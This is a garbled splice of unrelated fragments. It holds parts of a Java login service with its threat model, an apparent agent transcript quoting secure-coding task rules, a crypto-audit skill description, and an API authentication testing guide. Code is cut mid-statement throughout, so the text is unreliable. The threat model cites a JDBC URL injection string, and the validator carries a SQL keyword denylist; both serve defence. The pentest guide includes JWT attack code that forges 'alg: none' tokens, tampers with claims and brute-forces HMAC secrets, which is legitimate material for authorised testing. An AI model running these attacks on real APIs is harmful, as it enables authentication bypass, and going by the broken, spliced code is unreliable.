On every path\n * except a successful credential match that derivation uses a fixed-length internal password sample\n * rather than the caller's, so:\n * <ul>\n *   <li>unknown address costs the same as a known address - response time does not answer \"does this\n *       account exist?\";</li>\n *   <li>throttled, malformed-email, malformed-password, storage-failure and wrong-password attempts\n *       each cost the same as those;</li>\n *   <li>cost never depends on the caller's input length, so an attacker cannot make one class of\n *       attempt cheaper than another or use request cost as a denial-of-service dial.</li>\n * </ul>\n * On top of that the wall-clock duration of every call is floored at {@link Config#minLoginMs()}\n * (see {@link #padToFloor}) so the derivation's own cost is not a usable signal either.\n *\n * <p>Order of operations: validate -&gt; reserve budget -&gt; read credential -&gt; derive -&gt;\n * compare -&gt; grant. The reservation happens before the credential is read, so the decision to\n * throttle depends only on the account hash and the source label, never on whether a row exists. A\n * budget row is written on failed attempts against unknown addresses too, so the write pattern does\n * not reveal existence either.\n *\n * <p>Fail closed: any storage error, rejected row, or unexpected state produces\n * {@link Outcome#DENIED}. There is no path from an exception to {@link Outcome#GRANTED}.\n */\nfinal class AuthService {\n\n    /** Exactly two user-visible outcomes. ThrottleStore.attemptBudgets(identityHash, config.sourceId(), config);\n            boolean slot;\n            boolean budgetKnown = true;\n            try {\n                slot = A memory-hard KDF (Argon2id) is the\n * better choice for a store whose dump can be taken offline; swapping it in changes only this class.\n *\n * <p>The supplied password is never wiped by this class - it is owned by the caller, and the same\n * array is deliberately used twice per login attempt (see {@link AuthService}). PasswordHasher(int defaultIterations) {\n        if (defaultIterations < MIN_ITERATIONS || defaultIterations > MAX_ITERATIONS) {\n            throw new IllegalArgumentException(\"iteration_range\");\n        }\n        this.defaultIterations = defaultIterations;\n    }\n\n    int defaultIterations() {\n        return defaultIterations;\n    }\n\n    byte[] newSalt() {\n        return java.util.Arrays;\n\n/**\n * Cryptographic helpers. Every method here is either a hash, a constant-time compare, or a\n * CSPRNG draw. Nothing in this class accepts a security decision as an argument.\n */\nfinal class CryptoUtils {\n\n    static final SecureRandom RANDOM = new SecureRandom();\n\n    private CryptoUtils() {\n    }\n\n    static byte[] sha256(byte[] data) {\n        try {\n            return MessageDigest.getInstance(\"SHA-256\").digest(data);\n        } catch (NoSuchAlgorithmException e) {\n            // SHA-256 is mandated by the JCE spec; absence means an unusable platform.\n            throw new IllegalStateException(\"sha256_unavailable\", e);\n        }\n    }\n\n    static byte[] sha256(String text) {\n        return sha256(text.getBytes(StandardCharsets.UTF_8));\n    }\n\n    /**\n     * Length-independent constant-time comparison. return false;\n        }\n        boolean eq = constantTimeEquals(cand, stored);\n        Arrays.fill(cand, (byte) 0);\n        Arrays.fill(stored, (byte) 0);\n        return eq;\n    }\n\n    static      int v = data[i] & 0xFF;\n            out[i * 2] = digits[v >>> 4];\n            out[i * 2 + 1] = digits[v & 0x0F];\n        }\n        return new String(out);\n    }\n\n    static byte[] IllegalArgumentException(\"bad_hex_char\");\n            }\n            out[i] = (byte) ((hi << 4) | lo);\n        }\n        return out;\n    }\n\n    private static byte[] tryHex(String s) {\n com.example.auth;\n\nimport java.sql.PreparedStatement;\nimport java.sql.ResultSet;\nimport java.sql.SQLException;\n\n/**\n * Server-side session store. A session exists only as a row in this table, so \"who is authenticated\"\n * is always answered from server-side state (rule 3) and never from something the caller presents.\n *\n * <p>Rule 4: a token is generated here from {@link java.security.SecureRandom} - 256 bits, never\n * derived from, accepted from, or predictable by the caller. Only its SHA-256 is stored, so a dump of\n * this table yields no usable credential. A token a caller presents (for revocation) is validated as\n * 64 lowercase hex and looked up through the same hash, so no comparison ever touches a stored secret\n * and no branch depends on its content.\n *\n * <p>Rule 7: issue, verify, and revoke are each a single statement. Revocation decides its outcome\n * from the affected-row count of one {@code DELETE}, so two concurrent revocations of one token\n * cannot both succeed. Expiry is enforced inside the {@code WHERE} clause rather than by reading a\n * row and comparing it in Java.\n *\n * <p>Statements run under {@link Database#jdbcLock()} because a JDBC connection is not thread-safe;\n * this is what makes a single {@link AuthService} safe to share across threads.\n *\n * <p>There is no HTTP layer in this program, so no cookie is set here. The attributes a front end must\n * attach when carrying this token are recorded in {@link #cookieAttributesFor()}.\n */\nfinal class SessionStore {\n\n    private final Database database;\n    private final String table;\n\n    SessionStore(Database database) {\n        this.database = database;\n        this.table = database.sessionTable();\n    }\n\n    /**\n     * Issues a session for an identity whose password has just been verified.\n     *\n     * @return the token, which is the only place the raw value exists\n     */\n    String issue(long identityId, int ttlSeconds, String sourceId) throws Database.StorageException {\n        if (identityId <= 0) {\n            throw new Database.StorageException(\"session_identity_invalid\");\n        }\n        byte[] raw = CryptoUtils.randomBytes(32);\n        String token = CryptoUtils.toHex(raw);\n        CryptoUtils.wipe(raw);\n        long now = System.currentTimeMillis() / 1000L;\n        long expiresAt = now + ttlSeconds;\n        if (expiresAt <= now) {\n            throw new Database.StorageException(\"session_ttl_invalid\");\n        }\n        synchronized (database.jdbcLock()) {\n            try (PreparedStatement ps = database.prepare(\n                    \"INSERT INTO \" + table\n                            + \" (token_hash, identity_id, issued_at_epoch_sec, expires_at_epoch_sec,\"\n                            + \" source_id) VALUES (?,?,?,?,?)\")) {\n                ps.setString(1, CryptoUtils.toHex(CryptoUtils.sha256(token)));\n                ps.setLong(2, identityId);\n                ps.setLong(3, now);\n                ps.setLong(4, expiresAt);\n                ps.setString(5, sourceId);\n                if (ps.executeUpdate() != 1) {\n                    // A session that could not be recorded must not be handed out: fail closed.\n                    throw new Database.StorageException(\"session_insert_failed\");\n                }\n            } catch (SQLException e) {\n                throw new Database.StorageException(\"session_insert_failed\", e);\n            }\n        }\n        return token;\n    }\n\n    /**\n     * Resolves a presented token to an identity. Returns {@code null} for anything that is not a live\n     * session - wrong shape, unknown, revoked, or expired - with no distinction between them.\n     */\n    Long verify(String presentedToken) throws Database.StorageException {\n        String token;\n        try {\n            token = InputValidator.requireSessionToken(presentedToken);\n        } catch (InputValidator.ValidationException e) {\n            return null;\n        }\n        long now = System.currentTimeMillis() / 1000L;\n        synchronized (database.jdbcLock()) {\n            try (PreparedStatement ps = database.prepare(\n                    \"SELECT identity_id FROM \" + table\n                            + \" WHERE token_hash = ? AND expires_at_epoch_sec > ?\")) {\n                ps.setString(1, CryptoUtils.toHex(CryptoUtils.sha256(token)));\n                ps.setLong(2, now);\n                try (ResultSet rs = ps.executeQuery()) {\n                    if (!rs.next()) {\n                        return null;\n                    }\n                    long id = rs.getLong(1);\n                    if (rs.next() || id <= 0) {\n                        // token_hash is the primary key, so a second row means corruption. Deny.\n                        throw new Database.StorageException(\"session_row_rejected\");\n                    }\n                    return Long.valueOf(id);\n                }\n            } catch (SQLException e) {\n                throw new Database.StorageException(\"session_verify_failed\", e);\n            }\n        }\n    }\n\n    /**\n     * Revokes a token. The single {@code DELETE} is both the check and the act, so the boolean result\n     * is exact and race-free.\n     */\n    boolean revoke(String presentedToken) throws Database.StorageException {\n        String token;\n        try {\n            token = InputValidator.requireSessionToken(presentedToken);\n        } catch (InputValidator.ValidationException e) {\n            return false;\n        }\n        synchronized (database.jdbcLock()) {\n            try (PreparedStatement ps = database.prepare(\n                    \"DELETE FROM \" + table + \" WHERE token_hash = ?\")) {\n                ps.setString(1, CryptoUtils.toHex(CryptoUtils.sha256(token)));\n                return ps.executeUpdate() == 1;\n            } catch (SQLException e) {\n                throw new Database.StorageException(\"session_revoke_failed\", e);\n            }\n        }\n    }\n\n    /** Deletes sessions whose expiry has passed. FOR UPDATE} on each budget row in sorted key order, only then\n * reads the counter, and either commits the increment or rolls it back. Two concurrent attempts\n * therefore cannot both consume the last slot: whichever loses the row lock blocks, re-reads the\n * committed value, and is refused. Sorted lock order is what stops two attempts that touch the same\n * two budgets (one account, one source) from deadlocking each other.\n *\n * <p>Two independent budgets per attempt: one keyed on the account, one keyed on the request source.\n * The per-account budget alone is a lockout weapon - anyone who knows an address can burn it - so the\n * per-source budget is what bounds how many accounts one source can lock out per window, and\n * {@link Config} refuses a configuration where the source budget is smaller than the account budget.\n *\n * <p>Deliberate choice: a <em>successful</em> login refunds its own account budget ({@link #refund})\n * and consumes no source slot. Otherwise an attacker holding one valid credential could keep spending\n * budget with genuine authentications - or let a legitimate user's correct sign-ins do it for them -\n * until the account or source is locked, turning the limit into a denial-of-service tool. Only failed\n * and refused attempts are charged.\n *\n * <p>Fail-closed: if a reservation cannot be completed - engine error, lock timeout, a stored\n * counter outside the range this code could have written - the attempt is refused, never allowed.\n *\n * <p>Transactions are explicit: auto-commit is turned off for the duration of one operation and\n * restored afterwards, so the credential read on the same connection always runs in its own\n * auto-committed statement.\n */\nfinal class ThrottleStore implements AutoCloseable {\n\n    private static final String IDENTITY_PREFIX = \"i:\";\n    private static final String SOURCE_PREFIX = \"s:\";\n    /** Length of the account-key prefix used when clearing budgets for a recreated account. */\n    private static final int CLEAR_PREFIX_LEN = 12;\n\n    private final Database database;\n    private final Connection connection;\n    private final String table;\n\n    /** Injectable clock; production uses the wall clock, tests drive window rollover directly. */\n    interface TimeSource {\n        long epochMillis();\n    }\n\n    static final TimeSource SYSTEM_CLOCK = System::currentTimeMillis;\n\n    ThrottleStore(Database database) {\n        this.database = database;\n        this.connection = database.transactionConnection();\n        this.table = database.throttleTable();\n    }\n\n    /**\n     * Atomically consumes one slot from each budget, or none at all.\n     *\n     * <p>{@code synchronized} serialises reservations inside this process; the row locks serialise\n     * them across processes. Both are needed: the shared transaction connection means two threads\n     * must not interleave statements in one transaction, and the row locks are what make the\n     * reservation correct against another JVM holding the same store.\n     *\n     * @param keys budget keys; the caller supplies a small fixed number\n     * @return true when every budget had a free slot and the increment is now committed\n     */\n    boolean reserve(List<BudgetKey> keys, long nowMillis) throws Database.StorageException {\n        List<BudgetKey> ordered = new ArrayList<>(keys);\n        ordered.sort(Comparator.comparing(BudgetKey::key));\n        return inTransaction(tx -> {\n            for (BudgetKey k : ordered) {\n                if (!reserveOne(tx, k, nowMillis)) {\n                    // Signal \"refuse\" by unwinding; nothing is committed.\n                    throw new Refused();\n                }\n            }\n            return true;\n        }).booleanValue();\n    }\n\n    /** true when the slot was taken and the row updated; false means this budget is exhausted. */\n    private boolean reserveOne(Tx tx, BudgetKey k, long nowMillis) throws SQLException {\n        int current;\n        long windowStart;\n        try (PreparedStatement lock = tx.prepare(\n                \"SELECT used, window_started_at_epoch_ms FROM \" + table\n                        + \" WHERE tkey = ? FOR UPDATE\")) {\n            lock.setString(1, k.key());\n            try (ResultSet rs = lock.executeQuery()) {\n                if (rs.next()) {\n                    current = rs.getInt(1);\n                    windowStart = rs.getLong(2);\n                } else {\n                    current = 0;\n                    windowStart = nowMillis;\n                    try (PreparedStatement ins = tx.prepare(\n                            \"INSERT INTO \" + table\n                                    + \" (tkey, window_started_at_epoch_ms, used, limit_value,\"\n                                    + \" updated_at_epoch_ms) VALUES (?,?,?,?,?)\")) {\n                        ins.setString(1, k.key());\n                        ins.setLong(2, windowStart);\n                        ins.setInt(3, 0);\n                        ins.setInt(4, k.limit());\n                        ins.setLong(5, nowMillis);\n                        if (ins.executeUpdate() != 1) {\n                            throw new SQLException(\"throttle_insert_failed\");\n                        }\n                    }\n                }\n            }\n        }\n        if (nowMillis < windowStart) {\n            // The clock stepped backwards (NTP correction). A window that the clock has already\n            // passed cannot be trusted to bound anything, so restart it.\n            windowStart = nowMillis;\n            current = 0;\n        } else if (nowMillis - windowStart >= k.windowMillis()) {\n            windowStart = nowMillis;\n            current = 0;\n        }\n        if (current < 0) {\n            // A negative counter is something this code could never have written: the row is not\n            // trustworthy, so the attempt is refused as a storage failure rather than trusted to\n            // bound anything.\n            throw new SQLException(\"throttle_state_rejected\");\n        }\n        if (current >= k.limit()) {\n            // Covers both the normal exhausted case and an operator having lowered the configured\n            // limit below a counter written under the old one. Both mean \"no slot left\"; treating\n            // the second as an error would lock every account with a live counter out of the\n            // system on an ordinary config change. Interleaving two reservations there would let one thread's statement be\n     * committed by another's {@code commit()}.\n     */\n    private <T> T inTransaction(TxBody<T> body) throws Database.StorageException {\n        synchronized (connection) {\n            return inTransactionLocked(body);\n        }\n    }\n\n    private <T> T inTransactionLocked(TxBody<T> body) throws Database.StorageException {\n        Tx tx = new Tx();\n        boolean restored = false;\n        try {\n            connection.setAutoCommit(false);\n        } catch (SQLException e) {\n            throw new Database.StorageException(\"throttle_txn_begin_failed\", e);\n        }\n        T result;\n        try {\n            result = body.run(tx);\n            connection.commit();\n        } catch (Refused refused) {\n            rollback();\n            return cast(false);\n        } catch (SQLException e) {\n            rollback();\n            throw new Database.StorageException(\"throttle_txn_failed\", e);\n        } catch (Exception e) {\n            rollback();\n            throw new Database.StorageException(\"throttle_txn_unexpected\", e);\n        } finally {\n            try {\n                connection.setAutoCommit(true);\n                restored = true;\n            } catch (SQLException ignored) {\n                // Falls through to the storage failure below.\n            }\n        }\n        if (!restored) {\n            throw new Database.StorageException(\"throttle_txn_autocommit\");\n        }\n        return result;\n    }\n\n    private void rollback() {\n        try {\n            connection.rollback();\n        } catch (SQLException ignored) {\n            // The engine dropped the transaction; the next attempt fails closed on its own.\n        }\n    }\n\n    @SuppressWarnings(\"unchecked\")\n    private static <T> T cast(Object value) {\n        return (T) value;\n    }\n\n    interface TxBody<T> {\n        T run(Tx tx) throws Exception;\n    }\n\n    /** Statement factory bound to the transaction's connection. */\n    final class Tx {\n        PreparedStatement prepare(String sql) throws SQLException {\n            return connection.prepareStatement(sql);\n        }\n    }\n\n    /** Unwinds a reservation whose budget was already spent; not an error. */\n    private static final class Refused extends RuntimeException {\n        private static final long serialVersionUID = 1L;\n    }\n\n    static BudgetKey identityBudget(String emailHash, int limit, int windowSec) {\n        return new BudgetKey(IDENTITY_PREFIX + emailHash, limit, windowSec * 1000L);\n    }\n\n    /**\n     * The source budget key is a hash of the source label so its length is fixed and it cannot\n     * smuggle characters into the key column. rest of the\n * program may use. Every method either returns a validated value or throws\n * {@link ValidationException} whose message is a fixed code token that never contains the\n * offending input.\n *\n * <p>Nothing here is    \"values\", \"where\", \"from\", \"into\", \"set\", \"grant\", \"revoke\", \"exec\", \"call\", \"init\",\n            \"runscript\", \"shutdown\", \"in\", \"and\", \"or\", \"not\", \"null\", Carries a code token only, never the offending value. */\n    static final class ValidationException extends Exception {\n        private static final long serialVersionUID = 1L;\n\n        ValidationException(String code) {\n            super(code);\n        }\n    }\n\n    /**\n     * Validates and normalises an email address.\n     *\n     * <p>Accepted: printable ASCII only, exactly one {@code @}, local part 1-64 chars from\n     * {@code [A-Za-z0-9._%+-]}, domain of 1-127 dot-separated labels from {@code [A-Za-z0-9.-]},\n     * each label 1-63 chars, not starting or ending with a hyphen, no consecutive dots, TLD of at\n     * least two ASCII letters (so a dotted-quad IP address is refused), and no trailing root dot.\n     * The whole address is at most 254 chars. Input inventory (everything treated as attacker-controlled)\n\n| # | Input | Source | Validation |\n|---|-------|--------|-----------|\n| I1 | email address | stdin | printable-ASCII only, exactly one `@`, local 1-64 / domain 1-253, allowlisted chars, FQDN domain with alphabetic TLD, total <= 254, ASCII-lowercased |\n| I2 | password | stdin (`Console.readPassword`) | 12-1024 chars, <= 1024 UTF-8 bytes, no control/blank/NUL chars, no unpaired surrogates; never rendered as `String` |\n| I3 | database path | env `AUTH_DB_PATH` | absolute, canonical, no `;`/`=`, no newline/NUL, parent dir required + 0700, refuses symlink / foreign owner / group-or-world-writable file / world-writable dir |\n| I4 | JDBC user | env `AUTH_DB_USER` | SQL identifier allowlist `^[A-Za-z_][A-Za-z0-9_]{0,29}$`, non-reserved |\n| I5 | DB password | env `AUTH_DB_PASSWORD` or prompted | never argv, never logged, never in the JDBC URL string, wiped after connect |\n| I6 | table names | env | same identifier allowlist + reserved-word denylist; used only in DDL/metadata, always double-quoted |\n| I7 | iteration count, lockout windows, limits, TTLs | env | `^[0-9]{1,9}$` then integer range check; out of range = refuse to start |\n| I8 | source/tenant label | env `AUTH_SOURCE_ID` | `^[A-Za-z0-9][A-Za-z0-9._-]{0,47}$`; treated as spoofable, see R6 |\n| I9 | log file path / session-emit flag | env | absolute, size-capped, created 0600; flag must be exactly `true`/`false` |\n| I10 | rows read back from the DB | database | algorithm allowlist, salt length == 16, iterations in range, digest length == 32, status allowlist, expiry/limit sanity - a tampered row can never raise the security bar |\n| I11 | session token presented for logout | stdin | exactly 64 lowercase hex, then compared as `SHA-256(token)` |\n| I12 | CLI flags | argv | fixed allowlist; unknown flag refused; no secret ever accepted here |\n| I13 | files/JVM/env inherited | OS | refuses to run if `file.encoding` is not UTF-8 compatible; jars pinned + digest-checked |\n\n## 2. Attacks and what blocks them\n\n- **SQL injection in any form** (I1, I8, I11): every statement that carries a value is a\n  `PreparedStatement` with `?` bind parameters. Only fixed literals are concatenated.\n- **SQL identifier injection** (I4, I6): identifier allowlist + reserved-word denylist +\n  double-quoting; a source-text test asserts no interpolation of any variable into SQL.\n- **JDBC URL injection** (`;INIT=RUNSCRIPT FROM ...`): the path rejects `;`, `=`, control chars;\n  a probe confirmed H2 also refuses such a path. No URL option is configurable at runtime.\n- **Auth bypass via DB row tampering** (I10): row fields are validated before use; an unsupported\n  algorithm, short salt or absurd iteration count denies and is logged.\n- **Timing oracle - \"does this email exist\"**: an unknown address hashes the *supplied* password\n  against a deterministic blind salt (`SHA-256(\"blind-v1:\"+email)`, first 16 bytes) at the same\n  iteration count, so both branches run one real PBKDF2. Every early exit does the same blind hash.\n- **Timing oracle - \"throttled vs wrong password\"**: throttle decisions are taken *before* hashing\n  and depend only on (identity-hash, source-label), never on whether the account exists.\n- **Existence leak via DB writes**: the per-identity throttle row is created for failed attempts on\n  *unknown* addresses too, so a failed login always writes the same rows.\n- **Credential stuffing / password spray**: two independent counters - per identity (default 8/15m)\n  and per source (default 120/15m) - so one source cannot economically burn lockouts across many\n  accounts; a successful login refunds its own identity counter so a real user is never locked out\n  by their own successes.\n- **Check-then-act race on the lockout counter**: reserve-and-increment happens inside one\n  transaction holding `SELECT ... FOR UPDATE` on each throttle row (rows locked in sorted key order\n  to avoid deadlock). Verified by racing threads. Lock timeout denies.\n- **Double-spend / TOCTOU on sessions**: logout is a single `DELETE ... WHERE token_hash=?` whose\n  affected-row count decides the outcome; issue inserts the session in the same transaction that\n  clears the counters.\n- **Session guessing**: 256 bits from `SecureRandom`, never accepted from the caller except on\n  logout where it is a 64-hex check and is compared as a hash - the stored value is never\n  recoverable and comparison time is constant.\n- **Session fixation**: ids are generated only here; `verify` never echoes or re-issues.\n- **Log forging via CRLF in the email** (I1): emails cannot contain control chars, and every log\n  line is re-validated against a `[\\w:=./@*+ -]` charset before it is written - a line that fails\n  is replaced by a fixed string.\n- **Secret leakage into logs/stdout**: passwords exist only as `char[]`; there is no\n  `new String(...)` anywhere in main sources (asserted by test). Log API takes opaque event tokens\n  plus a masked address (`a***@example.com`). DB connect errors are mapped to a generic reason.\n- **Secret leakage via files**: log file created `0600`, DB dir `0700`, DB files chmodded `0600`\n  (measured: H2 creates them `0644`, so this is done explicitly, not trusted).\n- **Password in argv**: not supported anywhere; `ps` would show it.\n- **Malformed/oversized input**: hard caps on every length, input longer than the cap is refused\n  rather than truncated; stdin exhaustion fails closed (denies) instead of retrying.\n- **Unicode tricks**: `PBEKeySpec` maps unpaired surrogates to `?`, so they are refused; NUL and\n  trailing control chars (which make `\"pw\"` and `\"pw\\0\"` hash identically) are refused; the email\n  is compared only in one normalized form, so no case/whitespace variant reaches the DB.\n- **`ACCESS_MODE_DATA` misunderstanding**: it governs read/write, not POSIX bits - so the file mode\n  is set explicitly and asserted in a test.\n\n## 3. Accepted, documented residual risks\n\n- **R6 `AUTH_SOURCE_ID` is caller-supplied.** A hostile process that can set the environment can\n  pick its own per-source budget. Real deployments must take the source from server-side state\n  (authenticated tenant id / session-bound IP) - documented at the call site.\n- **Identity lockout is inherently shared.** Any attacker who knows an address can consume that\n  address's identity budget. The per-source counter is what bounds the damage; the identity window\n  is short (15 min) and self-healing.\n- **Emails are stored as unsalted SHA-256.** Chosen for data minimisation (no cleartext address in\n  the DB); a DB dump therefore lets an attacker test candidate addresses against the hash. A keyed\n  hash (HMAC with a server-side secret) removes that at the cost of losing all accounts if the key\n  is lost; not enabled here, deliberately.\n- **H2 is an embedded file engine** - one JVM at a time, no TLS. The JDBC credential is a\n  local-file credential, not a network secret; with a networked engine, use TLS + a least-privilege\n  role and keep this same code path.\n- **Session id is printed to stderr** when `AUTH_EMIT_SESSION=true` (default, so the feature is\n  demonstrable). That value is a bearer credential: it is not written to the log file and not\n  printed when the flag is `false`.\n- **In-process throttle** bounds attempts this process handles; a real fleet needs the shared\n  counters (which are in SQL here, so they are already shared across processes).\n"}]}},{"type":"assistant","uuid":"03c00f3b-7358-4e26-8960-6fbdddd6d7d0","session_id":"15b75387-eef7-4ab5-8b68-aa4a52e4c3fc","parent_tool_use_id":null,"message":{"id":"03c00f3b-7358-4e26-8960-6fbdddd6d7d0","type":"message","role":"assistant","model":"vllm-general","content":[{"type":"thinking","thinking":"Note the threat model says: \"Session id is printed to stderr when `AUTH_EMIT_SESSION=true` (default, so the feature is demonstrable)\". The program should accept the email address and password as user input, check the supplied credentials against credentials stored in an SQL database, and indicate whether authentication is successful or unsuccessful. Handle all user-controlled input securely when interacting with the database. BEFORE you write the code, think about how a security reviewer would attack this feature, and write the code so that reviewer has nothing to report. Apply these rules: 1. Trust boundaries. List every input this code can receive - including values from files, databases, configuration, environment, and anything a client controls - and treat everyone as attacker-controlled. Never use such a value without validating it (type, length, allowed characters, range), and never let it decide a security outcome unless it is checked against server-side state. 2. Secrets. Do not include credentials, keys, or passwords that would work if someone ran the program. Secrets come from configuration or runtime input, are never printed or logged, never placed in command-line arguments, error messages, or files readable by other users. 3. Authentication and access. Anything that proves who a user is or what they may do must be verified against server-side state; a missing or failed check fails closed, never open. Limit repeated attempts per source as well as per account, so an attacker cannot use your own limit to lock a legitimate user out. 4. Identifiers and tokens. Session identifiers and tokens must be generated by this code with a cryptographically secure random source - never accepted from or predictable from the caller. If the task says to use an externally provided identifier, validate it strictly and document the remaining risk. Cookies carry HttpOnly, Secure, SameSite, and a correct path. 5. Sensitive data. Mask sensitive values in logs and output; write them only to files created private to the owner; bound the size of anything you store; clear credentials from memory when done. 6. Failure behaviour. Report errors to users in generic terms; details go to the log only. Never let a response reveal whether an account or record exists: give identical messages and do comparable work for every failure outcome. This skill covers building an automated crypto audit tool that scans Python and configuration files for common cryptographic weaknesses.\n\n\n## When to Use\n\n- When conducting security assessments that involve performing cryptographic audit of application\n- When following incident response procedures for related security events\n- When performing scheduled security testing or auditing activities\n- When validating security controls through hands-on testing\n\n## Prerequisites\n\n- Familiarity with cryptography concepts and tools\n- Access to a test or lab environment for safe execution\n- Python 3.8+ with required dependencies installed\n- Appropriate authorization for any testing activities\n\n## Objectives\n\n- Detect usage of deprecated algorithms (MD5, SHA-1, DES, RC4)\n- Identify insecure cipher modes (ECB) and padding schemes\n- Find hardcoded keys, passwords, and secrets in source code\n- Verify TLS/SSL configuration strength\n- Check key derivation function parameters\n- Validate random number generator usage\n- Produce a structured audit report with findings and remediation\n\n## Key Concepts\n\n### Cryptographic Weakness Categories\n\n| Category | Examples | Risk Level |\n|----------|----------|------------|\n| Weak Hashing | MD5, SHA-1 for integrity/signatures | High |\n| Insecure Encryption | DES, 3DES, RC4, Blowfish | High |\n| Bad Cipher Mode | ECB mode for any block cipher | High |\n| Insufficient Key Size | RSA < 2048, AES-128 for long-term | Medium |\n| Hardcoded Secrets | Keys/passwords in source code | Critical |\n| Weak KDF | Low iteration PBKDF2, plain MD5 | High |\n| Poor Entropy | time-based seeds, predictable IVs | High |\n| Deprecated Protocols | SSLv3, TLS 1.0, TLS 1.1 | High |\n\n## Security Considerations\n\n- Review both application code and configuration files\n- Check third-party dependencies for known crypto vulnerabilities\n- Verify certificates and TLS configurations on deployed servers\n- Ensure secrets are loaded from environment variables or vaults\n- Review key storage and rotation practices\n\n## Validation Criteria\n\n- [ ] Scanner detects all injected test weaknesses\n- [ ] MD5/SHA-1 Activates for requests involving API authentication testing, token\n  validation assessment, credential security testing, or API auth bypass.\n\n  '\ndomain: cybersecurity\nsubdomain: api-security\ntags:\n- api-security\n- owasp\n- authentication\n- jwt\n- session-management\n- credential-security\nversion: 1.0.0\nauthor: mahipal\nlicense: Apache-2.0\nnist_csf:\n- PR.PS-01\n- ID.RA-01\n- PR.DS-10\n- DE.CM-01\nmitre_attack:\n- T1190\n- T1059.007\n- T1552.001\n- T1003\n- T1110\n---\n# Testing API Authentication Weaknesses\n\n## When to Use\n\n- Assessing REST API authentication mechanisms for bypass vulnerabilities before production deployment\n- Testing JWT token implementation for common weaknesses (none algorithm, key confusion, missing expiration)\n- Evaluating whether all API endpoints enforce authentication or if some are unintentionally exposed\n- Testing API key generation, storage, and rotation mechanisms for predictability or leakage\n- Validating session management including token expiration, revocation, and refresh token security\n\n**Do not use** without written authorization. Authentication testing involves attempting to bypass security controls.\n\n## Prerequisites\n\n- Written authorization specifying target API and authentication mechanisms in scope\n- Valid test credentials for at least two user roles (regular user, admin)\n- Burp Suite Professional with JWT-related extensions (JSON Web Tokens, JWT Editor)\n- Python 3.10+ with `requests`, `PyJWT`, and `jwt` libraries\n- Wordlists for credential testing (SecLists authentication wordlists)\n- API documentation or OpenAPI specification\n\n## Workflow\n\n### Step 1: Authentication Mechanism Identification\n\n```python\nimport requests\nimport json\n\nBASE_URL = \"https://target-api.example.com/api/v1\"\n\n# Probe the API to identify authentication mechanisms\nauth_indicators = {\n    \"jwt_bearer\": False,\n    \"api_key_header\": False,\n    \"api_key_query\": False,\n    \"basic_auth\": False,\n    \"oauth2\": False,\n    \"session_cookie\": False,\n    \"custom_token\": False,\n}\n\n# Test 1: Check unauthenticated access\nresp = requests.get(f\"{BASE_URL}/users/me\")\nprint(f\"Unauthenticated: {resp.status_code}\")\nif resp.status_code == 200:\n    print(\"[CRITICAL] Endpoint accessible without authentication\")\n\n# Test 2: Check WWW-Authenticate header\nif \"WWW-Authenticate\" in resp.headers:\n    scheme = resp.headers[\"WWW-Authenticate\"]\n    print(f\"Auth scheme advertised: {scheme}\")\n    if \"Bearer\" in scheme:\n        auth_indicators[\"jwt_bearer\"] = True\n    elif \"Basic\" in scheme:\n        auth_indicators[\"basic_auth\"] = True\n\n# Test 3: Login and examine tokens\nlogin_resp = requests.post(f\"{BASE_URL}/auth/login\",\n    json={\"username\": \"testuser@example.com\", \"password\": \"TestPass123!\"})\n\nif login_resp.status_code == Analysis\n\n```python\nimport base64\nimport json\nimport hmac\nimport hashlib\n\ndef decode_jwt_parts(token):\n    \"\"\"Decode JWT header and payload without verification.\"\"\"\n    parts = token.split('.')\n    if len(parts) != 3:\n        return None, None\n\n    def pad_base64(s):\n        return s + '=' * (4 - len(s) % 4)\n\n    header = json.loads(base64.urlsafe_b64decode(pad_base64(parts[0])))\n    payload = json.loads(base64.urlsafe_b64decode(pad_base64(parts[1])))\n    return header, payload\n\n# Analyze the JWT token\ntoken = indent=2)}\")\n\n# Security checks\nissues = []\n\n# Check 1: Algorithm\nif header.get(\"alg\") == \"none\":\n    issues.append(\"CRITICAL: Algorithm set to 'none' - token signature not verified\")\nif header.get(\"alg\") in (\"HS256\", \"HS384\", \"HS512\"):\n    issues.append(\"INFO: Symmetric algorithm used - check for weak/default secrets\")\n\n# Check 2: Expiration\nif \"exp\" not in payload:\n    issues.append(\"HIGH: No expiration claim (exp) - token never expires\")\nelse:\n    import time\n    exp_time = payload[\"exp\"]\n    ttl = exp_time - time.time()\n    if ttl > 86400:\n        issues.append(f\"MEDIUM: Token TTL is {ttl/3600:.0f} hours - excessively long\")\n\n# Check 3: Sensitive data in payload\nsensitive_fields = [\"password\", \"ssn\", \"credit_card\", \"secret\", \"private_key\"]\nfor field in sensitive_fields:\n    if field in payload:\n        issues.append(f\"HIGH: Sensitive field '{field}' in JWT payload\")\n\n# Check 4: Missing claims\nexpected_claims = [\"iss\", \"aud\", \"exp\", \"iat\", \"sub\"]\nmissing = [c for c in expected_claims if c not in payload]\nif missing:\n    issues.append(f\"MEDIUM: Missing standard claims: {missing}\")\n\n# Check 5: Key ID\nif \"kid\" in header:\n    kid = header[\"kid\"]\n    # Test for path traversal in kid\n    issues.append(f\"INFO: Key ID (kid) present: {kid} - test for injection\")\n\nfor issue in issues:\n    print(f\"  [{issue.split(':')[0]}] {issue}\")\n```\n\n### Step 4: JWT Manipulation Attacks\n\n```python\n# Attack 1: Remove signature (alg: none)\ndef forge_none_algorithm(token):\n    \"\"\"Create a token with alg:none to bypass signature verification.\"\"\"\n    parts = token.split('.')\n    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))\n    header['alg'] = 'none'\n    new_header = base64.urlsafe_b64encode(\n        json.dumps(header).encode()).decode().rstrip('=')\n    # Variations of the none algorithm\n    return [\n forge_payload(token, modifications):\n    \"\"\"Modify payload claims and test if server validates signature.\"\"\"\n    parts = token.split('.')\n    payload = JWTs.\"\"\"\n    parts = token.split('.')\n    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))\n    if header.get('alg') not in ('HS256', 'HS384', 'HS512'):\n        print(\"Not an HMAC token, skipping brute force\")\n        return None\n\n    signing_input = f\"{parts[0]}.{parts[1]}\".encode()\n    signature = parts[2]\n\n    hash_func = {\n        'HS256': hashlib.sha256,\n        'HS384': hashlib.sha384,\n        'HS512': hashlib.sha512\n    }[header['alg']]\n\n    for secret in COMMON_JWT_SECRETS:\n        expected_sig = base64.urlsafe_b64encode(\n            hmac.new(secret.encode(), signing_input, hash_func).digest()\n        ).decode().rstrip('=')\n        if expected_sig == signature:\n            print(f\"[CRITICAL] JWT secret found: '{secret}'\")\n            return secret\n\n    print(\"No common secrets matched - consider using hashcat/john for extended brute force\")\n    return None\n\n# Test all attacks\nnone_tokens = Authentication** | OWASP API2:2023 - 